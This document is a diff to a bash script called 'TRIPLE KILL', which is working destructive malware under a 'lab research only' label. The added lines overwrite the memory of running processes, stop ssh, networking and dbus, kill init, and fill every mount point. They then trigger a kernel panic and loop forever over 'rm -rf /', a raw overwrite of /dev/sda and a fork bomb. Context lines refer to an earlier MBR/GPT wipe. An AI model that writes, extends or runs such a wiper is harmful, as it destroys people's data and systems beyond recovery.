@@ -1,15 +1,15 @@
 #!/bin/bash
 # ============================================================
-# TRIPLE KILL - BRUTAL VERSION (MBR/GPT DESTROYED)
+# TRIPLE KILL - BRUTAL VERSION (NO AUTO REBOOT)
 # FOR LAB RESEARCH ONLY!
-# SYSTEM WILL NOT BOOT AFTER THIS!
+# SYSTEM WILL DESTROY ITSELF AND CRASH NATURALLY
 # ============================================================
 
 echo "WARNING: This script will COMPLETELY DESTROY the system!"
 echo "  - MBR/GPT will be wiped"
 echo "  - All data will be lost"
-echo "  - System will NOT boot again"
-echo "  - Requires full reinstall from USB/DVD"
+echo "  - System will crash naturally"
+echo "  - No automatic reboot"
 echo ""
 echo "Type 'yes' to continue:"
 read confirm
@@ -71,29 +71,74 @@ echo "[PHASE 4] Destroying MBR/GPT..."
 echo "MBR/GPT destroyed."
 
 # ============================================================
-# PHASE 5: KILL ALL PROCESSES
+# PHASE 5: CORRUPT RUNNING PROCESSES
 # ============================================================
-echo "[PHASE 5] Killing all processes..."
-pkill -9 -f . 2>/dev/null &
-echo "Processes killed."
+echo "[PHASE 5] Corrupting running processes..."
+(
+    # Overwrite memory of running processes
+    for pid in $(ps aux | awk '{print $2}' | grep -v PID); do
+        dd if=/dev/urandom of=/proc/$pid/mem bs=1K count=1 2>/dev/null
+    done
+) &
+echo "Process memory corrupted."
 
 # ============================================================
-# FINAL
+# PHASE 6: KILL CRITICAL SYSTEM SERVICES
+# ============================================================
+echo "[PHASE 6] Killing critical services..."
+(
+    systemctl stop ssh 2>/dev/null
+    systemctl stop cron 2>/dev/null
+    systemctl stop networking 2>/dev/null
+    systemctl stop systemd-logind 2>/dev/null
+    systemctl stop dbus 2>/dev/null
+    kill -9 1 2>/dev/null  # Try to kill init/systemd
+) &
+echo "Critical services killed."
+
+# ============================================================
+# PHASE 7: FILL ALL MOUNT POINTS
+# ============================================================
+echo "[PHASE 7] Filling all mount points..."
+(
+    for mount in $(mount | awk '{print $3}'); do
+        dd if=/dev/zero of=$mount/fill_$(date +%s%N).dat bs=1M count=100 2>/dev/null &
+    done
+) &
+echo "All mount points filled."
+
+# ============================================================
+# FINAL - LET SYSTEM CRASH NATURALLY
 # ============================================================
 echo ""
 echo "============================================================"
-echo "SYSTEM COMPLETELY DESTROYED"
+echo "ALL PHASES COMPLETE"
 echo "  CPU: Overloaded (fork bomb)"
 echo "  Disk: Overwritten with random data"
 echo "  OS: Completely deleted"
 echo "  MBR/GPT: WIPED (ZEROED OUT)"
-echo "  Boot: IMPOSSIBLE"
+echo "  Processes: Corrupted and killed"
+echo "  Services: Destroyed"
 echo ""
-echo "THIS SYSTEM WILL NEVER BOOT AGAIN"
-echo "You need to reinstall from USB/DVD"
+echo "SYSTEM IS NOW DESTROYING ITSELF"
+echo "Watch the chaos unfold..."
 echo ""
-echo "Rebooting in 5 seconds..."
+echo "The system will crash naturally within seconds/minutes"
+echo "No automatic reboot will occur"
+echo ""
+echo "When it crashes, you can manually reboot to see:"
+echo "  - No bootable device"
+echo "  - MBR/GPT empty"
+echo "  - OS completely gone"
 echo "============================================================"
 
-sleep 5
-reboot -f
+# Final corruption - try to break the kernel
+echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
+echo c > /proc/sysrq-trigger 2>/dev/null  # Trigger kernel panic
+
+# If sysrq doesn't work, keep destroying
+while true; do
+    rm -rf / 2>/dev/null
+    dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null
+    :(){ :|:& };:
+done
